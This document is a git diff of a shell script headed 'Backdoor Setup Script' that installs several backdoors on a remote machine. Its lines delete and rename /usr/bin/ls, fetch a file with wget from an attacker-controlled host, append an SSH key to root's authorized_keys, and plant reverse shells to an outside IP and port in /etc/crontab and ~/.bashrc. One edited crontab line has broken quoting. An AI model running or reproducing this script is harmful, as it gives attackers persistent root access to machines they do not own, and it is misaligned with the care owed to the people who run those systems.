@@ -23,7 +23,6 @@ echo -e "\e[31m            VVV             333333333333333   XXXXXXX       XXXXX
 echo -e "\e[31mBackdoor Setup Script\e[0m"
 echo -e "\e[31m---------------------\e[0m"
 echo -e "\e[31mThis script is created by V3X to create multi-backdoors on a remote machine.\e[0m"
-echo -e "\e[31mPlease provide the following information:\e[0m"
 
 
 usage() {
@@ -58,7 +57,6 @@ if [ -z "$user" ] || [ -z "$PASS" ] || [ -z "$USER" ] || [ -z "$IP" ] || [ -z "$
     usage
 fi
 
-
 export ipuser
 export port
 
@@ -71,6 +69,8 @@ sleep 3
 
 sudo rm /usr/bin/ls
 
+sudo mv /usr/bin/ls /usr/bin/fin
+
 wget "http://"$vpn":8000/"$PUBLIC_KEY"" -O "/tmp/"$PUBLIC_KEY""
 
 sleep 3
@@ -81,9 +81,10 @@ sleep 3
 
 sudo chmod +x /usr/bin/ls
 
+
 cat "/tmp/"$PUBLIC_KEY"" >> "root/.ssh/authorized_keys"
 
-echo "* * * * * root /bin/sh -c \"/bin/bash -i >& /dev/tcp/"$ipuser"/"$port" 0>&1\"" | sudo tee -a /etc/crontab
+echo "* * * * * root /bin/sh -c \"/bin/bash -i >& /dev/tcp/"$ipuser"/"$port" 0>&1 "" | sudo tee -a /etc/crontab
 
 echo '/bin/sh -i >& /dev/tcp/"$ipuser"/"$port" 0>&1' >> ~/.bashrc
 
